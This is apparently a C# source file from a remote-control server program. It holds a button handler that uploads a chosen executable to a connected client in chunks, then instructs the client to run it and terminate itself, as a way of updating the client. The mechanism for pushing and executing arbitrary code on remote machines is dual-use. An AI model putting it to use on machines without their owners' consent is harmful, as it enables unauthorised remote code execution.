using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Server.Utils;

namespace RemoteControl.Server
{
    public partial class FrmMain
    {
        /// <summary>
        /// “更新客户端”按钮点击事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonExeCode_Click(object sender, EventArgs e)
        {
            if (this.currentSession == null)
            {
                MsgBox.Info("请先选择客户端！");
                return;
            }
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Title = "请选择客户端程序";
            ofd.Filter = "客户端(*.exe)|*.exe";
            ofd.FilterIndex = 1;
            ofd.Multiselect = false;
            if (ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                string codeFile = ofd.FileName;

                new Thread(() => {
                    string codeId = Guid.NewGuid().ToString();
                    System.IO.FileStream fs = new FileStream(codeFile, FileMode.Open, FileAccess.Read);
                    byte[] buffer = new byte[1024];
                    while (true)
                    {
                        int size = fs.Read(buffer, 0, buffer.Length);
                        if (size < 1)
                            break;
                        RequestTransportExecCode req = new RequestTransportExecCode();
                        req.Data = new byte[size];
                        for (int i = 0; i < req.Data.Length; i++)
                        {
                            req.ID = codeId;
                            req.Data[i] = buffer[i];
                        }
                        this.currentSession.Send(ePacketType.PACKET_TRANSPORT_EXEC_CODE_REQUEST, req);
                    }
                    fs.Close();
                    fs.Dispose();
                    this.currentSession.Send(ePacketType.PACKET_RUN_EXEC_CODE_REQUEST, new RequestRunExecCode()
                    {
                        ID = codeId,
                        Mode = eExecMode.ExecByFile,
                        FileArguments = "/delay:5000",
                        IsKillMySelf = true
                    });
                    MsgBox.Info("客户端更新指令已发送！");
                }) { IsBackground = true }.Start();
            }
        }
    }
}
